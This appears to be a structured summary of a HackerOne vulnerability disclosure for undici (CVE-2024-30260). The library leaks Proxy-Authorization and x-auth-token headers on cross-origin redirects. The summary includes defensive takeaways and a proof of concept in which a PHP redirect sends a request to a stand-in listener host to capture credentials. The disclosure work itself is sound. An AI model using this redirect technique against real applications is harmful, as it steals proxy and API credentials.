# Proxy-Authorization and x-auth-token Headers Not Cleared on Cross-Origin Redirects in Undici

## Metadata
- **Source:** HackerOne
- **Report:** 2408074 | https://hackerone.com/reports/2408074
- **Submitted:** 2024-03-08
- **Reporter:** iylz
- **Program:** Node.js/Undici
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Information Disclosure, Credential Leakage, Improper Header Handling, Cross-Origin Request Forgery
- **CVEs:** CVE-2024-30260
- **Category:** uncategorised

## Summary
Undici HTTP client fails to clear sensitive Proxy-Authorization and x-auth-token headers when redirecting to cross-origin destinations, despite properly clearing Authorization and Cookie headers. This allows authentication credentials intended for proxy servers to be leaked to arbitrary third-party domains through HTTP redirects.

## Attack scenario
1. Attacker controls a web server at origin A that includes sensitive authenticated content
2. Victim's application uses undici.request() with proxy authentication headers to fetch from origin A
3. Attacker's server at origin A returns a 301/302 redirect to attacker-controlled origin B (cross-origin)
4. Undici processes the redirect and strips Authorization and Cookie headers (correct behavior)
5. However, Proxy-Authorization and x-auth-token headers are NOT stripped before following redirect
6. Attacker's server at origin B receives the sensitive proxy credentials, compromising proxy authentication

## Root cause
Incomplete header sanitization logic in the redirect handling mechanism. The security fix implemented in v5.28.3 and v6.6.1 only addressed Authorization and Cookie headers, overlooking the Proxy-Authorization and x-auth-token headers which also constitute sensitive authentication material that must not traverse cross-origin boundaries.

## Attacker mindset
An attacker controlling a legitimate-looking endpoint or having compromised a server could inject redirect responses pointing to attacker-controlled infrastructure. By observing the forwarded proxy credentials, the attacker gains unauthorized access to proxy services or internal resources protected by proxy authentication, potentially enabling lateral movement or privilege escalation.

## Defensive takeaways
- Maintain comprehensive allowlists of all authentication-related headers that must be cleared on cross-origin redirects (Authorization, Cookie, Proxy-Authorization, x-auth-token, WWW-Authenticate, etc.)
- Implement centralized header sanitization logic to prevent inconsistencies across different header types
- Reference RFC 7231 Section 6.4 and RFC 7235 for standards-compliant handling of credentials across redirects
- Regularly audit HTTP client libraries for incomplete security patches affecting multiple related headers
- Use automated testing with multiple credential header types to verify redirect behavior
- Consider disallowing cross-origin redirects entirely when sensitive credentials are present, or require explicit configuration

## Variant hunting
Search for similar patterns in other HTTP client libraries (node-fetch, axios, got, request) where Authorization is cleared but other credential headers (WWW-Authenticate, Proxy-Authenticate, x-api-key, Authorization-Bearer variants) may not be. Check for incomplete patches that addressed only specific header names rather than header categories.

## MITRE ATT&CK
- T1190
- T1598
- T1187
- T1539

## Notes
This vulnerability exemplifies how security patches addressing one manifestation of a broader issue may leave related attack vectors unaddressed. The simultaneous existence of both cleared and uncleared credential headers suggests the patch was targeted rather than systemic. The x-auth-token header is particularly notable as it's non-standard but commonly used in internal APIs, suggesting this variant may affect applications using custom authentication schemes.

## Full report
<details><summary>Expand</summary>

**Summary:**: Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization and x-auth-token headers.

**Description:** 
Like https://github.com/nodejs/undici/security/advisories/GHSA-3787-6prv-h9w3, this is a fixed security issue in v5.28.3, v6.6.1, but I have tested the new version(v6.7.0) and it has not been fixed yet.

## Steps To Reproduce:
POC:
```
var undici = require('undici');

const {
    statusCode,
    headers,
    trailers,
    body
} = undici.request({
    method: 'GET',
    maxRedirections: 1,
    origin: "http://127.0.0.1/", 
    pathname: "",
    headers: {
        'content-type': 'application/json',
        'Cookie': 'secret Cookie',
        'Authorization': 'secret Authorization',
        'Proxy-Authorization': 'secret Proxy-Authorization',
        'x-auth-token': 'secret x-auth-token',
        'Host': 'test.cn'
    }
})
```

The http://127.0.0.1/ is a redirect server. Sourcecode:
```
<?php
header("Location: http://a.com:2333");
?>
```
Add the 1 record in the /etc/hosts file: 
```
127.0.0.1   a.com
```

Listening on port 2333 and discovering that Proxy-Authorization and x-auth-token headers has been passed.
{F3105815}



## Impact: 
```<=undici@6.7.0```

## Supporting Material/References:
https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Proxy-Authorization

## Impact

Undici already cleared Authorization and Cookie headers on cross-origin redirects, but did not clear Proxy-Authorization and x-auth-token headers.

</details>

---
*Analysed by Claude on 2026-05-24*
